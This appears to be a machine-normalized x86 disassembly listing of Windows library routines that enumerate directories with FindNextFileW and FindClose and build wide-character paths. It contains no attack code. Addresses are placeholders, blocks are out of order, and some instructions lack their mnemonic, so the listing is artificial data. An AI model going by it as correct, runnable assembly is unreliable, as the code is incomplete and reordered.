jmp r-xdata
mov eax edi
jmp r-xdata
mov edx [ esp + 0x20 ]
push edx
call sub_1002004f
add esp 0x4
call edi
mov esi eax
jmp r-xdata
cmp [ ecx + edi * 2 ] 0x2f
je r-xdata
lea ecx [ esp + 0x20 ]
mov [ esi ] 0x2
mov [ ebp ] 0x2
mov [ esi ] 0x3
mov [ ebp ] 0x3
jmp r-xdata
mov esi [ esp + 0x14 ]
mov [ esi ] 0x0
call sub_1001f560
mov [ esi + 0x4 ] eax
cmp [ esp + 0x34 ] edi
jb r-xdata
mov ecx [ esp + 0x28c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x274 ]
xor ecx esp
call sub_10020040
add esp 0x284
retn
call sub_1001f560
cmp [ esp + 0x34 ] 0x8
mov edi [ esp + 0x14 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jb r-xdata
lea edi [ eax - 0x1 ]
cmp edi eax
jbe r-xdata
mov eax esi
mov ecx [ esp + 0x20 ]
push ecx
call sub_1002004f
add esp 0x4
cmp [ esp + 0x34 ] 0x8
mov eax [ esp + 0x20 ]
jae r-xdata
call sub_1002059f
cmp [ eax + edi * 2 ] 0x3a
jne r-xdata
lea eax [ esp + 0x20 ]
sub_1001cb90
sub esp 0x258
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x254 ] eax
mov eax [ esp + 0x25c ]
push ebx
mov ebx [ esp + 0x270 ]
push ebp
mov ebp [ esp + 0x26c ]
push esi
mov esi [ esp + 0x26c ]
mov edx [ esi ]
push edi
mov edi [ esp + 0x278 ]
lea ecx [ esp + 0x14 ]
push ecx
push edx
mov [ esp + 0x18 ] eax
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x40 ]
lea edx [ eax + 0x2 ]
call [ GetLastError@IAT ]
mov edi eax
mov eax [ esi ]
test eax eax
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ esp + 0x44 ]
push eax
mov ecx ebp
call sub_1000155d
mov eax [ esp + 0x14 ]
test eax 0x400
je r-xdata
call sub_1001f560
mov ecx [ esp + 0x10 ]
mov edx edi
sub edx 0x12
neg edx
sbb edx edx
and edx edi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
jmp r-xdata
push eax
call [ FindClose@IAT ]
mov [ esi ] 0x0
test al 0x10
je r-xdata
mov [ edi ] 0x0
mov [ ebx ] 0x0
jmp r-xdata
mov ecx [ esp + 0x264 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_10020040
add esp 0x258
retn
mov [ edi ] 0x2
mov [ ebx ] 0x2
mov [ edi ] 0x3
mov [ ebx ] 0x3
jmp r-xdata
mov esi [ esp + 0x10 ]
mov [ esi ] 0x0
call sub_1001f560
mov [ esi + 0x4 ] eax
mov eax esi
sub_1001cca0
push ebp
mov ebp esp
push 0xffffffff
push sub_100472a0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
push 0x10
mov [ esi ] 0x0
mov [ ebp - 0x4 ] 0x0
call sub_10020186
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1001cd50
push 0xffffffff
push sub_100472c8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0xc ] esi
xor eax eax
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] ax
mov [ esp + 0x18 ] eax
call sub_1001ec70
mov ecx [ esp + 0x20 ]
mov edx [ ecx ]
mov eax edx
lea edi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
mov ecx esi
call sub_10009bf9
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn 0x8
sub_1001cdd0
sub esp 0x8
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
push esi
lea ecx [ esp + 0x10 ]
mov [ esp + 0xc ] esi
call sub_1001cca0
push esi
lea eax [ esp + 0xc ]
push esi
push eax
call sub_100289c4
lea ecx [ esp + 0x14 ]
add esp 0xc
cmp ecx edi
je r-xdata
mov esi [ edi + 0x4 ]
mov eax [ esp + 0xc ]
mov [ edi + 0x4 ] eax
mov [ esp + 0xc ] esi
test esi esi
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ edi ]
mov [ esp + 0x8 ] edx
mov [ edi ] eax
pop edi
pop esi
add esp 0x8
retn 0x4
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
sub_1001ce50
push esi
push edi
mov edi ecx
mov [ edi ] r--data
mov esi [ edi + 0x50 ]
test esi esi
je r-xdata
mov ecx edi
pop edi
pop esi
jmp sub_1001c4f0
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
sub_1001cea0
push esi
push edi
mov edi ecx
mov [ edi ] r--data
mov esi [ edi + 0x50 ]
test esi esi
je r-xdata
mov ecx edi
call sub_1001c4f0
test [ esp + 0xc ] 0x1
je r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push edi
call sub_1002004f
add esp 0x4
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
sub_1001cf00
push 0xffffffff
push sub_10047309
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x24 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x34 ]
xor ebp ebp
mov [ esp + 0x18 ] ebp
mov edi ecx
mov ecx [ esp + 0x38 ]
mov [ eax + 0x18 ] 0xf
mov [ eax + 0x14 ] ebp
mov [ esp + 0x20 ] eax
mov [ esp + 0x1c ] ecx
mov [ eax + 0x4 ] 0x0
mov edx [ edi + 0x14 ]
mov [ esp + 0x2c ] ebp
mov [ esp + 0x18 ] 0x1
cmp edx ebp
je r-xdata
mov ecx [ esp + 0x24 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn 0x8
mov ecx [ edi + 0x18 ]
lea esi [ edi + 0x4 ]
cmp ecx 0x8
jb r-xdata
mov [ esp + 0x14 ] esi
mov ebx esi
mov ebx [ esi ]
mov [ esp + 0x14 ] ebx
jmp r-xdata
call sub_1002059f
cmp ecx 0x8
jb r-xdata
cmp ebx ebp
je r-xdata
mov ecx [ edi + 0x18 ]
mov ebx [ edi + 0x14 ]
cmp ecx 0x8
jb r-xdata
cmp [ edi + 0x18 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ebp esi
mov ebp [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp ecx 0x8
jb r-xdata
cmp eax ebx
ja r-xdata
call sub_1002059f
cmp ecx 0x8
jb r-xdata
test ebp ebp
je r-xdata
call sub_1002059f
mov ecx [ edi + 0x14 ]
lea edx [ eax + ecx * 2 ]
cmp ebx edx
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x14 ]
mov esi [ esp + 0x20 ]
push eax
push esi
lea edx [ ecx + ebx * 2 ]
push edx
push ebp
call sub_1001f170
add esp 0x10
mov eax esi
cmp [ edi + 0x18 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp edi 0xfffffffc
je r-xdata
lea edx [ eax + edx * 2 ]
cmp ebx edx
jbe r-xdata
mov ecx [ edi + 0x14 ]
lea edx [ esi + ecx * 2 ]
cmp ebp edx
jb r-xdata
mov esi [ esi ]
cmp ecx 0x8
jb r-xdata
cmp eax ebp
ja r-xdata
call sub_1002059f
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp edi 0xfffffffc
je r-xdata
lea eax [ eax + ebx * 2 ]
cmp ebp eax
jbe r-xdata
sub_1001d060
push ecx
push esi
push edi
mov esi ecx
mov [ esp + 0x8 ] 0x0
call sub_1001ec70
mov eax [ eax ]
mov edi [ esp + 0x10 ]
push eax
push edi
mov ecx esi
call sub_1001cf00
mov eax edi
pop edi
pop esi
pop ecx
retn 0x4
sub_1001d090
push ebp
mov ebp esp
push 0xffffffff
push sub_10047340
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov edi [ esi + 0x4c ]
test edi edi
jne r-xdata
cmp [ edi + 0x4c ] 0x0
mov [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_1001c800
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ esi + 0x4c ]
add esi 0x38
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov ecx esi
call sub_1001c800
mov ecx eax
lea ebx [ ecx + 0x1 ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x4 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx ebx
push ecx
push eax
lea ecx [ edi + 0x38 ]
call sub_100024af
mov eax [ esi + 0x4c ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
push 0x3
push r--data
lea ecx [ eax + 0x38 ]
call sub_10007042
mov ecx [ esi + 0x4c ]
lea eax [ ebp - 0x4c ]
push eax
call sub_1001d060
mov ecx [ esi + 0x4c ]
push 0xffffffff
push 0x0
push eax
add ecx 0x38
mov [ ebp - 0x4 ] 0x1
call sub_10006f9b
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x4 ] 0x0
jb r-xdata
push 0x3
push r--data
lea ecx [ eax + 0x38 ]
call sub_10007042
mov eax [ esi + 0x4c ]
lea edx [ ebp - 0x30 ]
push edx
lea ecx [ eax + 0x1c ]
call sub_1001d060
mov ecx [ esi + 0x4c ]
push 0xffffffff
push 0x0
push eax
add ecx 0x38
mov [ ebp - 0x4 ] 0x2
call sub_10006f9b
cmp [ ebp - 0x18 ] 0x10
mov [ ebp - 0x4 ] 0x0
jb r-xdata
mov eax [ esi + 0x4c ]
push 0x1
push r--data
lea ecx [ eax + 0x38 ]
call sub_10007042
mov ecx [ ebp - 0x48 ]
push ecx
call sub_1002004f
add esp 0x4
mov eax [ esi + 0x4c ]
push 0x1
push r--data
lea ecx [ eax + 0x38 ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
call sub_10007042
mov eax [ ebp - 0x2c ]
push eax
call sub_1002004f
add esp 0x4
sub_1001d250
push ebp
mov ebp esp
push 0xffffffff
push sub_1004737e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push eax
push ecx
push edx
mov ecx edi
call sub_1001c6b0
xor ebx ebx
lea esi [ edi + 0x4c ]
mov [ edi ] r--data
mov [ esi ] ebx
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4 ] ebx
push 0x54
mov [ ebp - 0x4 ] 0x2
call sub_10020186
mov ecx eax
add esp 0x4
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] 0x3
cmp ecx ebx
je r-xdata
xor eax eax
call sub_1001c5a0
jmp r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_1001cdd0
mov eax [ ebp + 0xc ]
mov ecx [ esi ]
push 0xffffffff
push ebx
push eax
call sub_10002033
jmp r-xdata
sub_1001d310
push 0xffffffff
push sub_100473a8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0xc ] esi
mov edi [ esp + 0x20 ]
push edi
call sub_10001ce5
mov [ esi ] r--data
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
mov ecx [ edi + 0x2c ]
xor edx edx
mov [ esi + 0x2c ] ecx
push 0xffffffff
lea ecx [ esi + 0x30 ]
lea eax [ edi + 0x30 ]
push edx
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] edx
push eax
mov [ esp + 0x24 ] edx
mov [ ecx + 0x4 ] dl
call sub_100021b2
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn 0x4
sub_1001d390
push esi
push edi
mov edi [ esp + 0xc ]
push edi
mov esi ecx
call sub_1001d310
mov [ esi ] r--data
mov eax [ edi + 0x4c ]
mov [ esi + 0x4c ] eax
mov eax [ edi + 0x50 ]
mov [ esi + 0x50 ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
retn 0x4
add eax 0x4
mov ecx 0x1
[ eax ] ecx
sub_1001d3d0
sub esp 0x54
push ebx
mov bl [ esp + 0x5c ]
push esi
test bl bl
jne r-xdata
mov eax [ esp + 0x6c ]
test eax eax
jne r-xdata
mov esi [ esp + 0x6c ]
test esi esi
je r-xdata
mov ecx [ esp + 0x64 ]
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov eax [ esp + 0x64 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov eax [ esp + 0x68 ]
push ecx
mov ecx [ esp + 0x74 ]
push edx
push eax
push ecx
lea ecx [ esp + 0x18 ]
call sub_1001d250
push r--data
lea edx [ esp + 0xc ]
push edx
call sub_10023a01
pop esi
mov al bl
pop ebx
add esp 0x54
retn
mov [ esi ] 0x0
call sub_1001f560
mov [ esi + 0x4 ] eax
pop esi
mov al bl
pop ebx
add esp 0x54
retn
sub_1001d450
push 0xffffffff
push sub_100473f9
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xc0 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xd8 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0xe8 ]
mov edi [ esp + 0xec ]
xor ebx ebx
xor eax eax
mov [ esp + 0xd0 ] 0x7
mov [ esp + 0xcc ] ebx
mov [ esp + 0xbc ] ax
mov [ esp + 0xe0 ] ebx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
call sub_1001f560
mov eax [ esi ]
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x18 ]
push edx
lea ecx [ esp + 0xc0 ]
push ecx
add eax 0x24
push eax
lea edx [ esp + 0x34 ]
push edx
call sub_1001cb90
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0x14
neg ecx
sbb ecx ecx
mov [ esp + 0x20 ] eax
test ecx sub_1001c3a0
jne r-xdata
mov ecx esi
call sub_1001c490
cmp edi ebx
jne r-xdata
lea ebp [ ebx + 0x8 ]
lea esp [ esp ]
call sub_1001f560
mov esi eax
call [ GetLastError@IAT ]
lea ecx [ esp + 0xb8 ]
mov [ edi ] eax
mov [ edi + 0x4 ] esi
mov [ esp + 0xe0 ] 0xffffffff
call sub_100025e2
jmp r-xdata
push r--data
lea ecx [ esp + 0x30 ]
call sub_10001d1f
mov ecx [ esi ]
lea edx [ esp + 0x48 ]
push edx
mov [ esp + 0xe4 ] 0x1
call sub_1001ee80
mov esi eax
mov [ esp + 0xe0 ] 0x2
call sub_1001f560
mov edi eax
call [ GetLastError@IAT ]
push edi
push eax
push esi
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x74 ]
call sub_1001d250
push r--data
lea ecx [ esp + 0x68 ]
push ecx
call sub_10023a01
mov eax [ esi ]
cmp [ eax + 0x24 ] ebx
je r-xdata
mov [ edi ] ebx
call sub_1001f560
mov [ edi + 0x4 ] eax
mov ecx [ esp + 0xd8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0xc0 ]
xor ecx esp
call sub_10020040
add esp 0xd0
retn
mov ecx esi
call sub_1001c490
jmp r-xdata
mov eax [ esp + 0xbc ]
cmp [ esp + 0xd0 ] ebp
jae r-xdata
cmp [ esp + 0xd0 ] ebp
jb r-xdata
cmp [ eax ] 0x2e
jne r-xdata
lea eax [ esp + 0xbc ]
mov edx [ esp + 0xbc ]
push edx
call sub_1002004f
add esp 0x4
push ebx
lea eax [ esp + 0xbc ]
push eax
lea ecx [ esp + 0x34 ]
call sub_1000cc87
mov esi [ esi ]
mov ecx esi
mov [ esp + 0xe0 ] 0x3
call sub_1001e310
lea ecx [ esp + 0x2c ]
push ecx
mov ecx esi
call sub_1001ea50
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
mov [ esi + 0x1c ] edx
mov [ esi + 0x20 ] eax
cmp [ esp + 0x44 ] ebp
jb r-xdata
mov ecx [ esp + 0xcc ]
cmp ecx 0x1
je r-xdata
mov ecx [ esp + 0x30 ]
push ecx
call sub_1002004f
add esp 0x4
mov eax [ esi ]
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x18 ]
push edx
lea ecx [ esp + 0xc0 ]
push ecx
add eax 0x24
push eax
lea edx [ esp + 0x34 ]
push edx
call sub_1001cb90
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0x14
neg ecx
sbb ecx ecx
mov [ esp + 0x20 ] eax
test ecx sub_1001c3a0
je r-xdata
jae r-xdata
cmp edi ebx
je r-xdata
mov eax [ esp + 0xbc ]
cmp [ esp + 0xd0 ] ebp
jae r-xdata
call sub_1002059f
mov ecx [ esp + 0xcc ]
cmp [ eax + 0x2 ] 0x2e
jne r-xdata
lea eax [ esp + 0xbc ]
cmp ecx 0x2
jne r-xdata
sub_1001d700
push 0xffffffff
push sub_1004746f
mov eax [ fs : 0x0 ]
push eax
sub esp 0xdc
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xd8 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xf0 ]
mov [ fs : 0x0 ] eax
mov edi [ esp + 0x100 ]
mov esi [ esp + 0x104 ]
mov ebp [ esp + 0x108 ]
push 0x30
xor ebx ebx
push r--data
lea ecx [ esp + 0x30 ]
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] bl
call sub_100024af
cmp [ esi + 0x14 ] ebx
lea ecx [ esp + 0x28 ]
push ecx
push ebp
sete al
push esi
mov [ esp + 0x24 ] al
mov edx [ esp + 0x24 ]
push rw-data
push edx
mov [ esp + 0x10c ] ebx
call sub_1001d3d0
add esp 0x14
cmp [ esp + 0x40 ] 0x10
mov [ esp + 0x17 ] al
mov [ esp + 0xf8 ] 0xffffffff
jb r-xdata
cmp [ esp + 0x17 ] bl
jne r-xdata
mov eax [ esp + 0x2c ]
push eax
call sub_1002004f
add esp 0x4
mov ecx [ esp + 0xf0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0xd8 ]
xor ecx esp
call sub_10020040
add esp 0xe8
retn
xor ecx ecx
mov [ esp + 0xe8 ] 0x7
mov [ esp + 0xe4 ] ebx
mov [ esp + 0xd4 ] cx
cmp [ esi + 0x18 ] 0x8
mov [ esp + 0xf8 ] 0x1
mov [ esp + 0x24 ] ebx
mov [ esp + 0x18 ] ebx
jb r-xdata
lea eax [ esi + 0x4 ]
mov [ esp + 0x1c ] eax
mov edx [ esi + 0x4 ]
mov [ esp + 0x1c ] edx
jmp r-xdata
mov ecx [ esp + 0x1c ]
neg ecx
sbb ecx ecx
test ecx sub_1001c3a0
je r-xdata
mov eax [ esp + 0x2c ]
push eax
call sub_1002004f
add esp 0x4
push ebx
lea ecx [ esp + 0x20 ]
push ecx
lea ecx [ esp + 0x30 ]
call sub_1001cd50
mov eax [ edi ]
lea edx [ esp + 0x18 ]
push edx
lea ecx [ esp + 0x28 ]
push ecx
lea edx [ esp + 0xd8 ]
push edx
lea ecx [ esp + 0x34 ]
push ecx
add eax 0x24
push eax
lea edx [ esp + 0x30 ]
push edx
mov [ esp + 0x110 ] 0x2
call sub_1001c930
add esp 0x18
cmp [ esp + 0x40 ] 0x8
mov [ esp + 0xf8 ] 0x1
jb r-xdata
mov eax [ edi ]
cmp [ eax + 0x24 ] ebx
jne r-xdata
mov ecx edi
call sub_1001c490
push 0x30
push r--data
lea ecx [ esp + 0x30 ]
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] bl
call sub_100024af
mov eax [ esp + 0x1c ]
mov [ esp + 0xf8 ] 0x3
cmp ebp ebx
jne r-xdata
push ebx
lea ecx [ esp + 0xd4 ]
push ecx
lea ecx [ esp + 0x4c ]
call sub_1000cc87
lea edx [ esp + 0x44 ]
push edx
lea eax [ esp + 0x64 ]
push esi
push eax
mov [ esp + 0x104 ] 0x4
call sub_1001c720
add esp 0xc
mov esi [ edi ]
push 0xffffffff
push ebx
push eax
mov ecx esi
mov [ esp + 0x104 ] 0x5
call sub_10002033
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x18 ]
mov [ esi + 0x1c ] ecx
lea ecx [ esp + 0x60 ]
mov [ esi + 0x20 ] edx
mov [ esp + 0xf8 ] 0x4
call sub_100025e2
lea ecx [ esp + 0x44 ]
mov [ esp + 0xf8 ] 0x1
call sub_100025e2
cmp [ esp + 0xe8 ] 0x8
mov eax [ esp + 0xd4 ]
jae r-xdata
mov ecx edi
call sub_1001c490
jmp r-xdata
cmp [ esp + 0x40 ] 0x10
mov ecx [ esp + 0x20 ]
mov [ ebp ] eax
mov [ ebp + 0x4 ] ecx
jb r-xdata
mov edx [ esp + 0x20 ]
push edx
push eax
push esi
lea ecx [ esp + 0x34 ]
push ecx
lea ecx [ esp + 0x8c ]
call sub_1001d250
push r--data
lea edx [ esp + 0x80 ]
push edx
call sub_10023a01
cmp [ eax ] 0x2e
jne r-xdata
lea eax [ esp + 0xd4 ]
cmp [ esp + 0xe8 ] 0x8
jb r-xdata
mov edx [ esp + 0x2c ]
push edx
call sub_1002004f
add esp 0x4
jmp r-xdata
cmp [ esp + 0xe4 ] 0x1
je r-xdata
mov eax [ esp + 0xd4 ]
push eax
call sub_1002004f
add esp 0x4
push ebx
push edi
call sub_1001d450
add esp 0x8
push 0x1
lea ecx [ esp + 0xd4 ]
call sub_1001c430
cmp [ eax ] 0x2e
jne r-xdata
cmp [ esp + 0xe4 ] 0x2
jne r-xdata
sub_1001da40
push esi
mov esi ecx
mov eax [ esi ]
push edi
mov edi [ esp + 0xc ]
cmp eax 0xfffffffc
je r-xdata
lea eax [ edi + edi ]
add [ esi + 0x4 ] eax
pop edi
mov eax esi
pop esi
retn 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
call sub_1002059f
lea edx [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
jmp r-xdata
call sub_1002059f
cmp [ eax + 0x18 ] 0x8
jb r-xdata
mov ecx [ esi + 0x4 ]
push ebp
mov ebp [ eax + 0x14 ]
lea edx [ edx + ebp * 2 ]
lea ecx [ ecx + edi * 2 ]
pop ebp
cmp ecx edx
ja r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp ecx eax
jae r-xdata
sub_1001daa0
push 0xffffffff
push sub_100474a8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0x8 ] esi
mov eax [ esp + 0x20 ]
mov [ esi + 0x4 ] eax
mov [ esp + 0x14 ] 0x0
mov [ esi ] r--data
call sub_1001b693
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov eax esi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn 0x8
sub_1001db00
push ecx
mov eax [ esp + 0xc ]
push ebx
mov ebx [ esp + 0x24 ]
push ebp
push esi
mov esi [ esp + 0x20 ]
mov [ esp + 0xc ] ecx
mov ecx [ esp + 0x24 ]
mov [ esi ] eax
xor edx edx
push edi
mov edi [ esp + 0x20 ]
mov [ ebx ] ecx
mov eax [ esi ]
cmp eax edi
setne dl
mov ebp edx
cmp eax edi
je r-xdata
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
pop ecx
retn 0x1c
mov ecx [ ebx ]
cmp ecx [ esp + 0x2c ]
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esi ]
add edx 0x8
push edx
mov edx [ esp + 0x1c ]
push edx
mov edx edi
sub edx eax
push edx
push eax
push ecx
call sub_1001b946
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
mov [ esi ] edi
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x2
pop ebx
pop ecx
retn 0x1c
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov ecx [ ebx ]
cmp [ ecx ] ax
jne r-xdata
add [ esi ] eax
add [ ebx ] 0x2
xor ebp ebp
cmp [ esi ] edi
jne r-xdata
xor eax eax
mov eax [ esi ]
lea edx [ eax + 0x1 ]
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
pop ecx
retn 0x1c
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
sub_1001dbb0
sub esp 0x1c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x38 ]
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x40 ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x3c ]
mov [ esi ] edx
push edi
mov edi [ esp + 0x48 ]
xor edx edx
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0x38 ]
mov [ edi ] eax
mov eax [ esi ]
cmp eax ecx
setne dl
mov ebp edx
cmp eax ecx
je r-xdata
mov ecx [ esp + 0x28 ]
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
xor ecx esp
call sub_10020040
add esp 0x1c
retn 0x1c
mov eax [ esp + 0x10 ]
cmp [ edi ] eax
je r-xdata
mov ebx [ edi ]
call sub_10026450
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
sub ecx ebx
add edx 0x8
cmp eax ecx
mov eax [ esp + 0x14 ]
push edx
push eax
jg r-xdata
mov ecx [ eax ]
mov eax [ esi ]
mov [ esp + 0x24 ] ecx
movzx ecx [ eax ]
push ecx
lea edx [ esp + 0x2c ]
push edx
call sub_1001b60c
mov ebx eax
add esp 0x10
test ebx ebx
jl r-xdata
mov ecx [ esi ]
movzx edx [ ecx ]
push edx
push ebx
call sub_1001b60c
add esp 0x10
test eax eax
jl r-xdata
pop edi
pop esi
pop ebp
mov eax 0x2
pop ebx
